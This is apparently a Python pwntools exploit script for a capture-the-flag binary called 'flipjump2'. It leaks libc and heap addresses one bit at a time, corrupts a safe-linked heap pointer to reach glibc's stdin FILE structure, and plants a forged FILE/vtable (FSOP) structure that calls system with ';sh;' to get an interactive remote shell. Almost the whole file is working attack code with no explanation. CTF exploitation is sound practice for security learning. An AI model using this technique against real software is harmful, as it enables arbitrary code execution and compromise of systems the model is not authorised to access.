from pwn import *

context.terminal = ["tmux", "new-window"]
# context.log_level = "debug"

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].rjust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def jmp_table(victim, shift, next_pc):
    assert (0 <= shift <= 7)
    
    return p64(victim*8 + shift) + p64(next_pc)

# p = process("./flipjump_fixed")
p = remote("flipjump2.chal.perfect.blue", "1337")
libc = ELF("./libc.so.6")

def decrypt(cipher):
    key = 0
    plain = 0

    for i in range(1, 6):
        bits = 64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12

    return plain


def bypass_generator(length, temp = True):
    if length != 0x500:
        rand_ptr = length - 33*8
    else:
        rand_ptr = 0x3f8
    payload = b""
    if length != 0x500 and temp:
        payload += jmp_table(0x7, 0x0, ((0x10000000000000000 - (0x150//8))//0x2))   # pc = 0 * 8
    else:
        payload += jmp_table(0x7, 0x0, ((0x10000000000000000 - (0x130//8))//0x2))
    payload += jmp_table(rand_ptr, 0, 16)  # pc = 1 * 8
    payload += jmp_table(rand_ptr, 1, 16)  # pc = 2 * 8
    payload += jmp_table(rand_ptr, 1, 1)    # pc = 3 * 8
    payload += jmp_table(rand_ptr, 2, 16)  # pc = 4 * 8
    payload += jmp_table(rand_ptr, 2, 1)    # pc = 5 * 8
    payload += jmp_table(rand_ptr, 2, 2)    # pc = 6 * 8
    payload += jmp_table(rand_ptr, 2, 3)    # pc = 7 * 8
    payload += jmp_table(rand_ptr, 3, 16)  # pc = 8 * 8
    payload += jmp_table(rand_ptr, 3, 1)    # pc = 9 * 8
    payload += jmp_table(rand_ptr, 3, 2)    # pc = 10 * 8
    payload += jmp_table(rand_ptr, 3, 3)    # pc = 11 * 8
    payload += jmp_table(rand_ptr, 3, 4)    # pc = 12 * 8
    payload += jmp_table(rand_ptr, 3, 5)    # pc = 13 * 8
    payload += jmp_table(rand_ptr, 3, 6)    # pc = 14 * 8
    payload += jmp_table(rand_ptr, 3, 7)    # pc = 15 * 8
    payload += jmp_table(0x1000, 0x0, 0x0)
    
    assert(len(payload) <= length)
    payload += b"\x00"*(length - len(payload)) 
    
    return payload

def byte_generator(val, length):
    
    rand_ptr = 0x3e8 - (0x500 - length)
    
    payload = b""
    payload += jmp_table(0x0, 0x5, (rand_ptr + 0x10)//0x10)    # pc = 0 * 8
    payload += jmp_table(rand_ptr, 0, 16)   # pc = 1 * 8
    payload += jmp_table(rand_ptr, 1, 16)   # pc = 2 * 8
    payload += jmp_table(rand_ptr, 1, 1)    # pc = 3 * 8
    payload += jmp_table(rand_ptr, 2, 16)   # pc = 4 * 8
    payload += jmp_table(rand_ptr, 2, 1)    # pc = 5 * 8
    payload += jmp_table(rand_ptr, 2, 2)    # pc = 6 * 8
    payload += jmp_table(rand_ptr, 2, 3)    # pc = 7 * 8
    payload += jmp_table(rand_ptr, 3, 16)   # pc = 8 * 8
    payload += jmp_table(rand_ptr, 3, 1)    # pc = 9 * 8
    payload += jmp_table(rand_ptr, 3, 2)    # pc = 10 * 8
    payload += jmp_table(rand_ptr, 3, 3)    # pc = 11 * 8
    payload += jmp_table(rand_ptr, 3, 4)    # pc = 12 * 8
    payload += jmp_table(rand_ptr, 3, 5)    # pc = 13 * 8
    payload += jmp_table(rand_ptr, 3, 6)    # pc = 14 * 8
    payload += jmp_table(rand_ptr, 3, 7)    # pc = 15 * 8
    
    rand_ptr = 0x3f8 - (0x500 - length)
    payload += jmp_table(rand_ptr, 0x4, (rand_ptr)//0x10)  # pc = 16 * 8
    payload += jmp_table(rand_ptr, 0, 33)   # pc = 17 * 8
    payload += jmp_table(rand_ptr, 1, 33)   # pc = 18 * 8
    payload += jmp_table(rand_ptr, 1, 17)   # pc = 19 * 8
    payload += jmp_table(rand_ptr, 2, 33)   # pc = 20 * 8
    payload += jmp_table(rand_ptr, 2, 17)   # pc = 21 * 8
    payload += jmp_table(rand_ptr, 2, 18)   # pc = 22 * 8
    payload += jmp_table(rand_ptr, 2, 19)   # pc = 23 * 8
    payload += jmp_table(rand_ptr, 3, 33)   # pc = 24 * 8
    payload += jmp_table(rand_ptr, 3, 17)   # pc = 25 * 8
    payload += jmp_table(rand_ptr, 3, 18)   # pc = 26 * 8
    payload += jmp_table(rand_ptr, 3, 19)   # pc = 27 * 8
    payload += jmp_table(rand_ptr, 3, 20)   # pc = 28 * 8
    payload += jmp_table(rand_ptr, 3, 21)   # pc = 29 * 8
    payload += jmp_table(rand_ptr, 3, 22)   # pc = 30 * 8
    payload += jmp_table(rand_ptr, 3, 23)   # pc = 31 * 8
    
    payload += jmp_table(0x0, 0x5, 16)
    payload += jmp_table(rand_ptr, 0x4, 34)
    
    pc = 34
    bit = 0
    while (val >> bit) != 0:
        if (val >> bit) & 0x1:
            pc += 1
            payload += jmp_table((rand_ptr + (bit//8)), bit%8, pc)
        bit += 1
    payload += jmp_table(0x1000, 0, pc+1)
    
    assert(len(payload) <= length)
    payload += b"\x00"*(length - len(payload)) 
    
    return payload

p.sendafter(":\n", p64(0x410))
p.sendafter(":\n", byte_generator( 0x0 , 0x410))

p.sendafter(":\n", p64(0x400))
p.sendafter(":\n", bypass_generator(0x400))
p.sendlineafter("(Y/N)", "Y")


for i in range(0x1):
    p.sendafter(":\n", p64(0x10000))
    p.sendafter(":\n", byte_generator( 0x0, 0x10000 ))

    p.sendafter(":\n", p64(0x10000))
    p.sendafter(":\n", bypass_generator(0x10000, False))
    p.sendlineafter("(Y/N)", "Y")


# leak = 0x0
# i = 0

libc_leak = 0x0
i = 0
while i < 6*8:
    p.sendafter(":\n", p64(0x500))
    p.sendafter(":\n", byte_generator( ((0x40 + i//8) * 8) + (i%8) , 0x500))

    p.sendafter(":\n", p64(0x500))
    p.sendafter(":\n", bypass_generator(0x500))

    p.recvuntil(b"Flip[")
    if int(p.recvuntil(b"]")[:-1].decode()) != (0x40 + i//8):
        print("Falied, retry it")
        p.sendlineafter("(Y/N)", "Y")
        continue
    p.recvuntil(b"Bit ")
    if int(p.recv(1)[0] - ord('0')) != (i%8):
        print("Falied, retry it")
        p.sendlineafter("(Y/N)", "Y")
        continue
    libc_leak += (int(p.recvline().split(b"->")[0][-1] - ord('0')) << i)

    p.sendlineafter("(Y/N)", "Y")
    i += 1
    print(hex(libc_leak))

libc_base = libc_leak - 0x21a0d0
print(hex(libc_base))

heap_leak = 0x0
i = 0
while i < 6*8:
    p.sendafter(":\n", p64(0x500))
    p.sendafter(":\n", byte_generator( ((0x50 + i//8) * 8) + (i%8) , 0x500))

    p.sendafter(":\n", p64(0x500))
    p.sendafter(":\n", bypass_generator(0x500))

    p.recvuntil(b"Flip[")
    if int(p.recvuntil(b"]")[:-1].decode()) != (0x50 + i//8):
        print("Falied, retry it")
        p.sendlineafter("(Y/N)", "Y")
        continue
    p.recvuntil(b"Bit ")
    if int(p.recv(1)[0] - ord('0')) != (i%8):
        print("Falied, retry it")
        p.sendlineafter("(Y/N)", "Y")
        continue
    heap_leak += (int(p.recvline().split(b"->")[0][-1] - ord('0')) << i)

    p.sendlineafter("(Y/N)", "Y")
    i += 1
    print(hex(heap_leak))

heap_base = heap_leak - 0x2f0
print(hex(heap_base))

p.sendafter(":\n", p64(0x640))
p.sendafter(":\n", byte_generator( 0x889*8 + 0x2 , 0x640))

p.sendafter(":\n", p64(0x640))
p.sendafter(":\n", bypass_generator(0x640, False))
p.sendlineafter("(Y/N)", "Y")

p.sendafter(":\n", p64(0x640))
p.sendafter(":\n", byte_generator( (0x889+0x650)*8 + 0x2 , 0x640))

p.sendafter(":\n", p64(0x640))
p.sendafter(":\n", bypass_generator(0x640, False))
p.sendlineafter("(Y/N)", "Y")

p.sendafter(":\n", p64(0x440))
p.sendafter(":\n", byte_generator( (0x889+0x650*2)*8 + 0x2 , 0x440))

p.sendafter(":\n", p64(0x440))
p.sendafter(":\n", bypass_generator(0x440, False))
p.sendlineafter("(Y/N)", "Y")

p.sendafter(":\n", p64(0x440))
p.sendafter(":\n", byte_generator( (0x889+0x650*2+0x450)*8 + 0x2 , 0x440))

p.sendafter(":\n", p64(0x440))
p.sendafter(":\n", bypass_generator(0x440, False))
p.sendlineafter("(Y/N)", "Y")

base_ptr = heap_base + 0x11a0
target_ptr = libc_base + libc.symbols['_IO_2_1_stdin_'] - 0x10
current_ptr = heap_base + 0xb50
current_value = ((base_ptr >> 12) ^ current_ptr)
target_value = ((base_ptr >> 12) ^ target_ptr)
i = 0
while i < 6*8:
    if (target_value >> i) & 1 == (current_value >> i) & 1:
        i += 1
        continue
    p.sendafter(":\n", p64(0x500))
    p.sendafter(":\n", byte_generator( ((0xee0 + i//8) * 8) + (i%8) , 0x500))

    p.sendafter(":\n", p64(0x500))
    p.sendafter(":\n", bypass_generator(0x500))

    p.recvuntil(b"Flip[")
    if int(p.recvuntil(b"]")[:-1].decode()) != (0xee0 + i//8):
        print("Falied, retry it")
        p.sendlineafter("(Y/N)", "Y")
        continue
    p.recvuntil(b"Bit ")
    if int(p.recv(1)[0] - ord('0')) != (i%8):
        print("Falied, retry it")
        p.sendlineafter("(Y/N)", "Y")
        continue
    heap_leak += (int(p.recvline().split(b"->")[0][-1] - ord('0')) << i)

    p.sendlineafter("(Y/N)", "Y")
    i += 1
    print(hex(heap_leak))

# base_ptr = heap_base + 0x1c40
# target_ptr = libc_base + libc.symbols['_IO_2_1_stdin_'] 
# current_ptr = heap_base + 0x17f0
# current_value = ((base_ptr >> 12) ^ current_ptr)
# target_value = ((base_ptr >> 12) ^ target_ptr)
# i = 0
# while i < 6*8:
#     if (target_value >> i) & 1 == (current_value >> i) & 1:
#         i += 1
#         continue
#     p.sendafter(":\n", p64(0x500))
#     p.sendafter(":\n", byte_generator( ((0xee0 + 0xaa0 + i//8) * 8) + (i%8) , 0x500))

#     p.sendafter(":\n", p64(0x500))
#     p.sendafter(":\n", bypass_generator(0x500))

#     p.recvuntil(b"Flip[")
#     if int(p.recvuntil(b"]")[:-1].decode()) != (0xee0 + 0xaa0+ i//8):
#         print("Falied, retry it")
#         p.sendlineafter("(Y/N)", "Y")
#         continue
#     p.recvuntil(b"Bit ")
#     if int(p.recv(1)[0] - ord('0')) != (i%8):
#         print("Falied, retry it")
#         p.sendlineafter("(Y/N)", "Y")
#         continue
#     heap_leak += (int(p.recvline().split(b"->")[0][-1] - ord('0')) << i)

#     p.sendlineafter("(Y/N)", "Y")
#     i += 1
#     print(hex(heap_leak))

p.sendafter(":\n", p64(0x240))
p.sendafter(":\n", p64(0x100000) + p64(0x0) + p64(libc_base+libc.symbols['system']) + p64(libc_base+0x273888) + p64(0x0) + p64(libc_base+0x273890) + \
                    p64(0x0) + p64(libc_base + 0x2732e0) + p64(0x0) + p64(libc_base+0x273870) * (0x240//0x8 - 9))

FSOP = FSOP_struct(flags = u64(b"\x01\x01\x01\x01;sh;"), \
        _IO_write_ptr  = 0x10, \
        lock            = heap_base + 0x9000 + 0x100, \
        _wide_data      = libc_base + libc.symbols['_IO_2_1_stdin_'], \
        _offset         = heap_base + 0x9000, \
        _IO_buf_base    = 0x1, \
        _chain          = 0x0, \
        _markers        = libc_base + libc.symbols['system'], \
        _mode           = 0xffffffff, \
        vtable          = libc_base + libc.symbols['_IO_wfile_jumps'], \
        more_append     = p64(libc_base + libc.symbols['_IO_2_1_stdin_'] - 0x8)
        )
p.sendafter(":\n", p64(0x240))
p.sendafter(":\n", p64(0x100000) + p64(0x0) + FSOP + b"\x00" *(0x230 - len(FSOP)))

p.interactive()